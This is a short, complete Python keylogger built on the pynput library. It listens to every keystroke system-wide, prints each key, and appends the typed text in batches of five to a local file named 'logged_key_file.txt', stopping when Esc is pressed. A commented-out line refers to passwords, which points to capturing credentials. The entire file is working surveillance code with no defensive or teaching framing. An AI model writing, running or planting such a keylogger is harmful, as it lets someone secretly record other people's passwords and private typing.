import pynput
import pynput.keyboard as CurrentKeyboard
import os

log_interval = 0

logged_keys = []

def key_pressed(key):
    global logged_keys, log_interval
    logged_keys.append(key)
    log_interval+=1 
    print(key)
    if log_interval == 5:
        write_on_file(logged_keys)
        logged_keys = []
        log_interval = 0
    
def key_released(key):
    if key == CurrentKeyboard.Key.esc: 
        return False
    
def write_on_file(logged_keys):
     openWrite = open('logged_key_file.txt', 'a')
     for key in logged_keys:
        clean_string = str(key).replace("'","")
        if key == CurrentKeyboard.Key.space:
            openWrite.write(' ')
        elif key == CurrentKeyboard.Key.enter:
            openWrite.write('\n')
        # elif clean_string.find("x13") > 0:        # Contradicts password with x13
        #     openWrite.write('\n File was saved ')
        elif clean_string.find("Key") == -1:
            openWrite.write(clean_string)
        else:
            continue 
    
    
with CurrentKeyboard.Listener(on_press=key_pressed, on_release=key_released) as global_listener:
    global_listener.join()




 
